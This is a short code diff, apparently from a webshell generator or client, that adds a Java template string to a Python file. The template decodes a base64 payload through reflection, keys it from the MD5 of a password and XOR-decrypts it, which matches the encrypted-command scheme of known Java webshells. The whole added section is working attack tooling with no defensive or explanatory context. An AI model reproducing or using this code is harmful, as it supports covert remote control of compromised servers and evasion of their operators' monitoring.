@@ -32,3 +32,38 @@ code = """
         );
     }
 """
+
+proc = """
+            Class base64;
+            Object decoder;
+            byte[] bytes = null;
+            java.security.MessageDigest h;
+
+            try {
+                base64 = Class.forName("java.util.Base64");
+                decoder = base64.getMethod("getDecoder")
+                    .invoke(base64);
+                bytes = (byte[]) decoder.getClass()
+                    .getMethod("decode", String.class)
+                    .invoke(decoder, payload);
+            } catch (ClassNotFoundException e) {
+                try {
+                    base64 = Class.forName("sun.misc.BASE64Decoder");
+                    decoder = base64.newInstance();
+                    bytes = (byte[]) decoder.getClass()
+                        .getMethod("decodeBuffer", String.class)
+                        .invoke(decoder, payload);
+                } catch (Exception ex) {}
+            } catch (Exception ex) {}
+
+            h = java.security.MessageDigest.getInstance("MD5");
+            h.update(password.getBytes(), 0, password.length());
+            byte[] key = new BigInteger(1, h.digest()).toString(16)
+                .substring(0, 16).getBytes();
+
+            byte[] result = new byte[bytes.length];
+            for (int i = 0; i < result.length; i++) {
+                result[i] = (byte) (bytes[i] ^ key[i + 1 & 15]);
+            }
+            bytes = result;
+"""
